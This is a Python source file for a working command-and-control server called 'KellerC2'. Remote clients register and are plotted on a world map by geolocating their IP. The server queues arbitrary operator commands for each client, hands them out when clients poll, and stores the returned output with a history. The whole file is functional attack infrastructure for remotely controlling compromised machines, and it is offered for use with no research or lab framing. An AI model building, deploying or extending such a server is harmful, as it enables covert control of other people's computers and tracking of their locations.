#!/usr/bin/env python3
from http.server import HTTPServer, ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from urllib.request import urlopen
from urllib.error import URLError
import json
import random
import sqlite3
import threading
import time
import os

INDEX_PAGE = """
<html>
<head>
    <title>KellerC2</title>
    <link rel=\"stylesheet\" href=\"https://unpkg.com/leaflet@1.9.4/dist/leaflet.css\" />
    <style>
      html, body { height: 100%; margin: 0; }
      #map { height: 100%; }
    </style>
    <script src=\"https://unpkg.com/leaflet@1.9.4/dist/leaflet.js\"></script>
    <script>
    let map;
    let markers = {};
    const STALE = 60000; // fade after 1 min
    const REMOVE = 300000; // remove after 5 min

    function escapeHtml(s) {
        const div = document.createElement('div');
        div.textContent = s;
        return div.innerHTML;
    }

    function popupContent(c) {
        const ts = new Date(c.last_seen * 1000).toLocaleString();
        return `<b>${c.id}</b><br>IP: ${c.ip}<br>Last seen: ${ts}<br>
            <form onsubmit=\"sendCmd(event,this,'${c.id}')\">
            <input name=cmd placeholder=Command />
            <button type=submit>Send</button>
            <span id=msg_${c.id}></span>
            </form>
            <div>Latest:</div>
            <pre id=res_${c.id}>${escapeHtml(c.result || '')}</pre>
            <div>History:</div>
            <ul id=hist_${c.id}></ul>`;
    }

    async function load() {
        const res = await fetch('/clients');
        const clients = await res.json();
        const now = Date.now();
        clients.forEach(c => {
            const age = now - c.last_seen * 1000;
            if (age > REMOVE) {
                if (markers[c.id]) {
                    map.removeLayer(markers[c.id]);
                    delete markers[c.id];
                }
                return;
            }
            let m = markers[c.id];
            const content = popupContent(c);
            if (!m) {
                m = L.marker([c.lat, c.lon]).addTo(map);
                markers[c.id] = m;
            }
            m.setLatLng([c.lat, c.lon]);
            if (m.getPopup()) m.getPopup().setContent(content);
            else m.bindPopup(content);
            m.off('popupopen');
            m.on('popupopen', () => {
                loadHistory(c.id);
            });
            if (m.isPopupOpen()) {
                loadHistory(c.id);
            }
            m.setOpacity(age > STALE ? 0.5 : 1);
            const pre = document.getElementById('res_'+c.id);
            if (pre) pre.textContent = c.result || '';
        });
    }

async function sendCmd(e, form, id) {
        e.preventDefault();
        const cmd = form.cmd.value;
        const msg = document.getElementById('msg_'+id);
        msg.textContent = '';
        try {
            const res = await fetch('/send', {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({client_id:id, command:cmd})
            });
            if (res.ok) {
                msg.textContent = 'Queued';
                msg.style.color = 'green';
            } else {
                const text = await res.text();
                msg.textContent = text || 'Error';
                msg.style.color = 'red';
            }
        } catch (err) {
            msg.textContent = 'Error';
            msg.style.color = 'red';
        }
    form.cmd.value='';
}

async function loadHistory(id) {
    const ul = document.getElementById('hist_'+id);
    if (!ul) return;
    ul.innerHTML = '';
    try {
        const res = await fetch('/history?client_id='+encodeURIComponent(id));
        if (res.ok) {
            const items = await res.json();
            items.forEach(r => {
                const li = document.createElement('li');
                const ts = new Date(r.ts * 1000).toLocaleString();
                li.innerHTML = `<b>${ts}</b><br><pre>${escapeHtml(r.result)}</pre>`;
                ul.appendChild(li);
            });
        } else {
            ul.textContent = 'Error';
        }
    } catch (err) {
        ul.textContent = 'Error';
    }
}

    window.onload = () => {
        map = L.map('map').setView([20,0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors'
        }).addTo(map);
        load();
        setInterval(load, 5000);
    };
    </script>
</head>
<body>
    <div id=\"map\"></div>
</body>
</html>
"""

DB_FILE = 'keller.db'
# open SQLite connection shared across threads
conn = sqlite3.connect(DB_FILE, check_same_thread=False)
conn.row_factory = sqlite3.Row

# lock serializes DB access; this limits concurrency but avoids corrupting
# shared state if multiple threads try to use the connection simultaneously.
# With many clients the server may become slower because each request must
# acquire this lock before accessing the database.
conn_lock = threading.Lock()
with conn_lock, conn:
    conn.execute(
        'CREATE TABLE IF NOT EXISTS clients('
        'id TEXT PRIMARY KEY, ip TEXT, lat REAL, lon REAL,'
        ' last_seen REAL, result TEXT)'
    )
    conn.execute(
        'CREATE TABLE IF NOT EXISTS commands('
        'id INTEGER PRIMARY KEY AUTOINCREMENT,'
        ' client_id TEXT, command TEXT, ts REAL)'
    )
    conn.execute(
        'CREATE TABLE IF NOT EXISTS results('
        'id INTEGER PRIMARY KEY AUTOINCREMENT,'
        ' client_id TEXT, result TEXT, ts REAL)'
    )
    conn.execute(
        'CREATE TABLE IF NOT EXISTS cmd_history('
        'id INTEGER PRIMARY KEY AUTOINCREMENT,'
        ' client_id TEXT, command TEXT, ts REAL)'
    )

REMOVE_CLIENT_AFTER = int(os.environ.get('REMOVE_CLIENT_AFTER', '3600'))
# keep at most this many results per client
RESULT_HISTORY_LIMIT = int(os.environ.get('RESULT_HISTORY_LIMIT', '100'))

def cleanup_task():
    while True:
        cutoff = time.time() - REMOVE_CLIENT_AFTER
        # serialize cleanup operations to avoid simultaneous writes
        with conn_lock, conn:
            conn.execute('DELETE FROM clients WHERE last_seen < ?', (cutoff,))
            conn.execute(
                'DELETE FROM commands WHERE client_id NOT IN '
                '(SELECT id FROM clients)'
            )
            conn.execute(
                'DELETE FROM results WHERE client_id NOT IN '
                '(SELECT id FROM clients)'
            )
            conn.execute(
                'DELETE FROM cmd_history WHERE client_id NOT IN '
                '(SELECT id FROM clients)'
            )
        time.sleep(60)

threading.Thread(target=cleanup_task, daemon=True).start()

def geolocate(ip):
    """Return (lat, lon) for the given IP using ip-api.com."""
    try:
        with urlopen(f"http://ip-api.com/json/{ip}", timeout=5) as r:
            data = json.load(r)
            if data.get("status") == "success":
                return float(data.get("lat", 0)), float(data.get("lon", 0))
    except URLError:
        pass
    # fall back to a random location if lookup fails
    return random.uniform(-60, 60), random.uniform(-180, 180)

class Handler(BaseHTTPRequestHandler):
    def _safe_write(self, body: bytes) -> None:
        """Write to the socket, ignoring errors if the client disconnected."""
        try:
            self.wfile.write(body)
        except OSError:
            pass

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        now = time.time()
        if self.path == '/register':
            client_id = None
            try:
                payload = json.loads(data.decode())
                client_id = payload.get('client_id')
                ip = payload.get('public_ip') or self.client_address[0]
            except Exception:
                pass
            if client_id:
                with conn_lock:
                    cur = conn.cursor()
                    if cur.execute('SELECT id FROM clients WHERE id=?', (client_id,)).fetchone():
                        cur.execute('UPDATE clients SET ip=?, last_seen=? WHERE id=?', (ip, now, client_id))
                    else:
                        count = cur.execute('SELECT COUNT(*) FROM clients WHERE ip=?', (ip,)).fetchone()[0]
                        lat, lon = geolocate(ip)
                        if count > 0:
                            lat += random.uniform(-0.02, 0.02)
                            lon += random.uniform(-0.02, 0.02)
                        cur.execute(
                            'INSERT INTO clients(id, ip, lat, lon, last_seen, result) '
                            'VALUES (?,?,?,?,?,?)',
                            (client_id, ip, lat, lon, now, '')
                        )
                    conn.commit()
                body = b'Registered'
                self.send_response(200)
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self._safe_write(body)
            else:
                body = b'Bad Request'
                self.send_response(400)
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self._safe_write(body)
        elif self.path == '/send':
            try:
                payload = json.loads(data.decode())
                cid = payload.get('client_id')
                cmd = payload.get('command')
                with conn_lock:
                    if cid and cmd and conn.execute('SELECT 1 FROM clients WHERE id=?', (cid,)).fetchone():
                        conn.execute(
                            'INSERT INTO commands(client_id, command, ts) VALUES (?,?,?)',
                            (cid, cmd, now)
                        )
                        conn.execute(
                            'INSERT INTO cmd_history(client_id, command, ts) VALUES (?,?,?)',
                            (cid, cmd, now)
                        )
                        conn.commit()
                        body = b'Command queued'
                        self.send_response(200)
                        self.send_header('Content-Length', str(len(body)))
                        self.end_headers()
                        self._safe_write(body)
                        return
            except Exception:
                pass
            body = b'Bad Request'
            self.send_response(400)
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self._safe_write(body)
        elif self.path == '/result':
            try:
                payload = json.loads(data.decode())
                cid = payload.get('client_id')
                res = payload.get('result')
                with conn_lock:
                    if cid and conn.execute('SELECT 1 FROM clients WHERE id=?', (cid,)).fetchone():
                        conn.execute(
                            'UPDATE clients SET result=?, last_seen=? WHERE id=?',
                            (res, now, cid)
                        )
                        conn.execute(
                            'INSERT INTO results(client_id, result, ts) VALUES (?,?,?)',
                            (cid, res, now)
                        )
                        conn.execute(
                            'DELETE FROM results WHERE client_id=? AND id NOT IN ('
                            'SELECT id FROM results WHERE client_id=? ORDER BY id DESC LIMIT ?)',
                            (cid, cid, RESULT_HISTORY_LIMIT)
                        )
                        conn.commit()
                        body = b'Result stored'
                        self.send_response(200)
                        self.send_header('Content-Length', str(len(body)))
                        self.end_headers()
                        self._safe_write(body)
                        return
            except Exception:
                pass
            body = b'Bad Request'
            self.send_response(400)
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self._safe_write(body)
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/clients':
            with conn_lock:
                rows = conn.execute(
                    'SELECT id, ip, lat, lon, result, last_seen FROM clients'
                ).fetchall()
                body = json.dumps([dict(row) for row in rows]).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self._safe_write(body)
        elif parsed.path == '/poll':
            qs = parse_qs(parsed.query)
            cid = qs.get('client_id', [None])[0]
            with conn_lock:
                row = conn.execute('SELECT id FROM clients WHERE id=?', (cid,)).fetchone()
                if row:
                    conn.execute('UPDATE clients SET last_seen=? WHERE id=?', (time.time(), cid))
                    cmd_row = conn.execute(
                        'SELECT id, command FROM commands WHERE client_id=? ORDER BY id LIMIT 1',
                        (cid,)
                    ).fetchone()
                    cmd = None
                    if cmd_row:
                        cmd = cmd_row['command']
                        conn.execute('DELETE FROM commands WHERE id=?', (cmd_row['id'],))
                    conn.commit()
                    body = json.dumps({'command': cmd}).encode()
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Content-Length', str(len(body)))
                    self.end_headers()
                    self._safe_write(body)
                else:
                    self.send_response(404)
                    self.send_header('Content-Length', '0')
                    self.end_headers()
        elif parsed.path == '/history':
            qs = parse_qs(parsed.query)
            cid = qs.get('client_id', [None])[0]
            with conn_lock:
                exists = conn.execute('SELECT 1 FROM clients WHERE id=?', (cid,)).fetchone()
                if exists:
                    rows = conn.execute(
                        'SELECT result, ts FROM results WHERE client_id=? ORDER BY ts DESC LIMIT 10',
                        (cid,)
                    ).fetchall()
                    body = json.dumps([dict(r) for r in rows]).encode()
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Content-Length', str(len(body)))
                    self.end_headers()
                    self._safe_write(body)
                else:
                    self.send_response(404)
                    self.send_header('Content-Length', '0')
                    self.end_headers()
        elif parsed.path == '/commands':
            qs = parse_qs(parsed.query)
            cid = qs.get('client_id', [None])[0]
            with conn_lock:
                exists = conn.execute('SELECT 1 FROM clients WHERE id=?', (cid,)).fetchone()
                if exists:
                    rows = conn.execute(
                        'SELECT command, ts FROM cmd_history WHERE client_id=? ORDER BY ts DESC LIMIT 10',
                        (cid,)
                    ).fetchall()
                    body = json.dumps([dict(r) for r in rows]).encode()
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Content-Length', str(len(body)))
                    self.end_headers()
                    self._safe_write(body)
                else:
                    self.send_response(404)
                    self.send_header('Content-Length', '0')
                    self.end_headers()
        elif parsed.path == '/result':
            qs = parse_qs(parsed.query)
            cid = qs.get('client_id', [None])[0]
            with conn_lock:
                row = conn.execute('SELECT result FROM clients WHERE id=?', (cid,)).fetchone()
                if row:
                    body = json.dumps({'result': row['result']}).encode()
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Content-Length', str(len(body)))
                    self.end_headers()
                    self._safe_write(body)
                else:
                    self.send_response(404)
                    self.send_header('Content-Length', '0')
                    self.end_headers()
        elif parsed.path == '/':
            body = INDEX_PAGE.encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', str(len(body)))
            self.end_headers()
            self._safe_write(body)
        else:
            self.send_response(404)
            self.send_header('Content-Length', '0')
            self.end_headers()

def run(port=8000):
    server_address = ('', port)
    # ThreadingHTTPServer allows multiple clients to poll concurrently
    httpd = ThreadingHTTPServer(server_address, Handler)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()

if __name__ == '__main__':
    run()
